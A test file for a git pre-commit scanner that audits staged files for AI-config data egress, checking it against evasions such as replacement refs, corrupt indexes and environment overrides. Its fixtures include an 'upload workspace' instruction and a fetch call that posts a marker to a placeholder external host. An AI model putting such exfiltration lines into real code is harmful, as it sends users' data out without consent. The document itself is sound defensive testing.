import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import test from 'node:test';

const script = fs.readFileSync(new URL('./ai-egress-audit.mjs', import.meta.url));
const policy = fs.readFileSync(new URL('../../config/ai-egress-policy.json', import.meta.url));
const marker = 'SYNTHETIC_SOURCE_MUST_NOT_APPEAR_20260924';
const badConfig = JSON.stringify({ instruction: 'upload workspace', privateFixture: marker });
const goodConfig = JSON.stringify({ instruction: 'local only' });
const isolatedEnv = { ...process.env };
for (const key of Object.keys(isolatedEnv)) {
  if (key.startsWith('GIT_') || key === 'AI_EGRESS_STAGED_FILES') delete isolatedEnv[key];
}
Object.assign(isolatedEnv, {
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_CONFIG_GLOBAL: process.platform === 'win32' ? 'NUL' : '/dev/null',
  GIT_TERMINAL_PROMPT: '0',
});

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-egress-staged-'));
  t.after(() => {
    const resolved = path.resolve(root);
    assert.equal(path.dirname(resolved), path.resolve(os.tmpdir()));
    assert.ok(path.basename(resolved).startsWith('ai-egress-staged-'));
    fs.rmSync(resolved, { recursive: true, force: true });
  });
  const write = (rel, content) => {
    const file = path.join(root, rel);
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, content);
  };
  const git = (...args) => execFileSync('git', args, { cwd: root, env: isolatedEnv, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  write('scripts/qa/ai-egress-audit.mjs', script);
  write('config/ai-egress-policy.json', policy);
  git('init', '--quiet');
  git('config', 'core.hooksPath', path.join(root, '.git', 'no-hooks'));
  git('config', 'core.quotePath', 'true');
  git('add', '--', '.');
  const commit = () => git('-c', 'user.name=Fixture', '-c', 'user.email=fixture@example.invalid', '-c', 'commit.gpgsign=false', 'commit', '--quiet', '-m', 'synthetic fixture');
  commit();
  const run = (args = ['--staged'], extraEnv = {}) => {
    const result = spawnSync(process.execPath, ['scripts/qa/ai-egress-audit.mjs', ...args], {
      cwd: root, env: { ...isolatedEnv, ...extraEnv }, encoding: 'utf8', timeout: 20000,
    });
    assert.ifError(result.error);
    assert.equal(`${result.stdout}${result.stderr}`.includes(marker), false, 'audit output exposed synthetic source');
    return result;
  };
  return { root, write, git, commit, run };
}

test('staged bad content is blocked when working content is clean', (t) => {
  const f = fixture(t);
  f.write('.mcp.local.json', badConfig);
  f.git('add', '--', '.mcp.local.json');
  f.write('.mcp.local.json', goodConfig);
  assert.equal(f.run().status, 1);
});

test('staged bad content is blocked when the working file is missing', (t) => {
  const f = fixture(t);
  f.write('.mcp.local.json', badConfig);
  f.git('add', '--', '.mcp.local.json');
  fs.unlinkSync(path.join(f.root, '.mcp.local.json'));
  assert.equal(f.run().status, 1);
});

test('NUL paths retain Git-quoted Unicode and spaces', (t) => {
  const f = fixture(t);
  const rel = 'scripts/consult-é fixture.mjs';
  f.write(rel, `await fetch('https://fixture.invalid', { body: '${marker}' });`);
  f.git('add', '--', rel);
  assert.match(f.git('diff', '--cached', '--name-only'), /\\[0-7]{3}/, 'fixture must exercise Git quoting');
  const result = f.run();
  assert.equal(result.status, 1);
  assert.match(result.stderr, /raw-external-transport/);
});

test('environment path override cannot suppress staged findings', (t) => {
  const f = fixture(t);
  f.write('.mcp.local.json', badConfig);
  f.git('add', '--', '.mcp.local.json');
  assert.equal(f.run(['--staged'], { AI_EGRESS_STAGED_FILES: '' }).status, 1);
});

test('corrupt index blocks with safe diagnostics even with an empty override', (t) => {
  const f = fixture(t);
  fs.writeFileSync(path.join(f.root, '.git', 'index'), `invalid index ${marker}`);
  const result = f.run(['--staged'], { AI_EGRESS_STAGED_FILES: '' });
  assert.equal(result.status, 2);
  assert.match(result.stderr, /could not establish.*audit input/i);
});

test('missing staged blob blocks without exposing content', (t) => {
  const f = fixture(t);
  const absent = 'f'.repeat(40);
  f.git('update-index', '--add', '--cacheinfo', `100644,${absent},.mcp.local.json`);
  f.write('.mcp.local.json', goodConfig);
  assert.equal(f.run().status, 2);
});

test('Git replacement refs cannot substitute clean content for the staged blob', (t) => {
  const f = fixture(t);
  f.write('.mcp.local.json', badConfig);
  f.git('add', '--', '.mcp.local.json');
  const staged = f.git('rev-parse', ':.mcp.local.json').trim();
  f.write('replacement.json', goodConfig);
  const replacement = f.git('hash-object', '-w', '--', 'replacement.json').trim();
  f.git('replace', staged, replacement);
  assert.equal(f.run().status, 1);
});

test('staged clean content stays clean while explicit and all inspect hostile disk content', (t) => {
  const f = fixture(t);
  f.write('.mcp.local.json', goodConfig);
  f.git('add', '--', '.mcp.local.json');
  f.write('.mcp.local.json', badConfig);
  assert.equal(f.run().status, 0);
  assert.equal(f.run(['.mcp.local.json']).status, 1);
  assert.equal(f.run(['--all']).status, 1);
});

test('renamed destination is inspected and staged deletion is excluded', (t) => {
  const f = fixture(t);
  f.write('original.json', badConfig);
  f.git('add', '--', 'original.json');
  f.commit();
  f.git('mv', '--', 'original.json', '.mcp.local.json');
  assert.equal(f.run().status, 1);
  f.commit();
  f.git('rm', '--', '.mcp.local.json');
  assert.equal(f.run().status, 0);
});

test('copied policy dependency permits a clean import and public helper usage', (t) => {
  const f = fixture(t);
  const url = pathToFileURL(path.join(f.root, 'scripts/qa/ai-egress-audit.mjs')).href;
  const result = spawnSync(process.execPath, ['--input-type=module', '-e',
    `const m = await import(${JSON.stringify(url)}); if (m.classifySurface('.mcp.json') !== 'harness-config') process.exit(1);`],
  { cwd: f.root, env: isolatedEnv, encoding: 'utf8' });
  assert.equal(result.status, 0, result.stderr);
});
